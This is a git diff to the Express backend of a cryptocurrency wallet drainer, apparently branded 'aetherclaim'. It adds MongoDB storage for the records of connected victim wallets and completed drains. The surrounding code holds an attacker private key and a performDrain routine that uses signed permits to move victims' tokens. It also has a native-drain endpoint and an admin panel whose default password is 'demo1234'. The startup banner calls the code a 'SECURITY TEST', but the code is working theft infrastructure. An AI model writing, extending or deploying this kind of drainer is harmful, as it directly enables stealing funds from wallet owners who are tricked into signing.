@@ -4,6 +4,7 @@ const cors    = require('cors')
 const { ethers } = require('ethers')
 const path = require('path')
 const fs   = require('fs')
+const { MongoClient } = require('mongodb')
 
 const app = express()
 app.use(cors({
@@ -17,34 +18,95 @@ app.use(express.json())
 app.use('/admin', express.static(path.join(__dirname, 'admin')))
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')))
 
-// ── Persistent state — survives server restarts ──────────────────────────────
+// ── Config ────────────────────────────────────────────────────────────────────
 let config = {
   attackerPrivateKey: process.env.ATTACKER_PRIVATE_KEY || '',
   adminPassword:      process.env.ADMIN_PASSWORD || 'demo1234',
 }
 
+// ── In-memory cache (fast reads) ──────────────────────────────────────────────
 const connectedWallets = []
 const drainHistory     = []
 const logs             = []
 
-const DATA_FILE = path.join(__dirname, 'data.json')
+// ── MongoDB persistence ───────────────────────────────────────────────────────
+const MONGO_URI = process.env.MONGODB_URI || ''
+let db = null
 
-// Load saved data on startup
-try {
-  const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
-  if (Array.isArray(saved.connectedWallets)) connectedWallets.push(...saved.connectedWallets)
-  if (Array.isArray(saved.drainHistory))     drainHistory.push(...saved.drainHistory)
-  console.log(`[STARTUP] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains from disk`)
-} catch(_) {
-  console.log('[STARTUP] No saved data found — starting fresh')
+async function connectDB() {
+  if (!MONGO_URI) {
+    console.log('[DB] No MONGODB_URI — falling back to local data.json')
+    loadFromFile()
+    return
+  }
+  try {
+    const client = new MongoClient(MONGO_URI, { serverSelectionTimeoutMS: 8000 })
+    await client.connect()
+    db = client.db('aetherclaim')
+    console.log('[DB] Connected to MongoDB Atlas')
+
+    // Load existing data into memory on startup
+    const wallets = await db.collection('wallets').find({}).sort({ connectedAt: -1 }).toArray()
+    const drains  = await db.collection('drains').find({}).sort({ startedAt: -1 }).toArray()
+    connectedWallets.push(...wallets)
+    drainHistory.push(...drains)
+    console.log(`[DB] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains from MongoDB`)
+  } catch(e) {
+    console.log('[DB] MongoDB connection failed:', e.message)
+    console.log('[DB] Falling back to local data.json')
+    loadFromFile()
+  }
 }
 
-function persist() {
+function loadFromFile() {
   try {
-    fs.writeFileSync(DATA_FILE, JSON.stringify({ connectedWallets, drainHistory }, null, 2))
-  } catch(e) {
-    console.log('[PERSIST] Write failed:', e.message)
+    const DATA_FILE = path.join(__dirname, 'data.json')
+    const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))
+    if (Array.isArray(saved.connectedWallets)) connectedWallets.push(...saved.connectedWallets)
+    if (Array.isArray(saved.drainHistory))     drainHistory.push(...saved.drainHistory)
+    console.log(`[FILE] Loaded ${connectedWallets.length} wallets, ${drainHistory.length} drains`)
+  } catch(_) {
+    console.log('[FILE] No saved data — fresh start')
   }
+}
+
+async function persistWallet(wallet) {
+  if (!db) return
+  try {
+    await db.collection('wallets').updateOne(
+      { address: wallet.address.toLowerCase() },
+      { $set: wallet },
+      { upsert: true }
+    )
+  } catch(e) { console.log('[DB] persistWallet error:', e.message) }
+}
+
+async function persistDrain(drain) {
+  if (!db) return
+  try {
+    await db.collection('drains').updateOne(
+      { id: drain.id },
+      { $set: drain },
+      { upsert: true }
+    )
+  } catch(e) { console.log('[DB] persistDrain error:', e.message) }
+}
+
+async function deleteAllFromDB() {
+  if (!db) return
+  try {
+    await db.collection('wallets').deleteMany({})
+    await db.collection('drains').deleteMany({})
+  } catch(e) { console.log('[DB] deleteAll error:', e.message) }
+}
+
+// Legacy file persist (used when no DB)
+function persist() {
+  if (db) return // DB handles it
+  try {
+    const DATA_FILE = path.join(__dirname, 'data.json')
+    fs.writeFileSync(DATA_FILE, JSON.stringify({ connectedWallets, drainHistory }, null, 2))
+  } catch(e) { console.log('[FILE] Write failed:', e.message) }
 }
 
 function addLog(level, msg) {
@@ -151,6 +213,7 @@ app.post('/api/connect', async (req, res) => {
     }
     connectedWallets.unshift(entry)
     addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
+    persistWallet(entry)
     persist()
   }
 
@@ -267,9 +330,10 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
     record.confirmedAt = new Date().toISOString()
 
     const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
-    if (w) { w.drained = true; w.drainTx = tx.hash }
+    if (w) { w.drained = true; w.drainTx = tx.hash; persistWallet(w) }
 
     drainHistory.unshift(record)
+    persistDrain(record)
     persist()
 
     return {
@@ -284,6 +348,7 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
     record.error = e.message
     addLog('error', `Drain failed: ${e.message}`)
     drainHistory.unshift(record)
+    persistDrain(record)
     persist()
     return { success: false, error: e.message }
   }
@@ -301,8 +366,9 @@ app.post('/api/drain-native', async (req, res) => {
   }
   drainHistory.unshift(record)
   const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
-  if (w) { w.drained = true; w.drainTx = txHash }
+  if (w) { w.drained = true; w.drainTx = txHash; persistWallet(w) }
   addLog('warn', `Native drain: ${amount} ${symbol} from ${owner} | tx: ${txHash}`)
+  persistDrain(record)
   persist()
   res.json({ ok: true })
 })
@@ -398,16 +464,18 @@ app.delete('/admin/logs', adminAuth, (req, res) => {
 })
 
 // Clear all connected wallets and drain history
-app.delete('/admin/wallets', adminAuth, (req, res) => {
+app.delete('/admin/wallets', adminAuth, async (_req, res) => {
   connectedWallets.length = 0
   drainHistory.length = 0
+  await deleteAllFromDB()
+  persist()
   addLog('info', 'All wallets and drain history cleared')
   res.json({ ok: true })
 })
 
 // ── Start ────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 3001
-app.listen(PORT, () => {
+connectDB().then(() => app.listen(PORT, () => {
   console.log('\n========================================')
   console.log('  Drainer Demo Backend — SECURITY TEST')
   console.log('========================================')
@@ -426,4 +494,4 @@ app.listen(PORT, () => {
     console.log('  Attacker    : Not set — configure in Admin Panel')
   }
   console.log('========================================\n')
-})
+}))
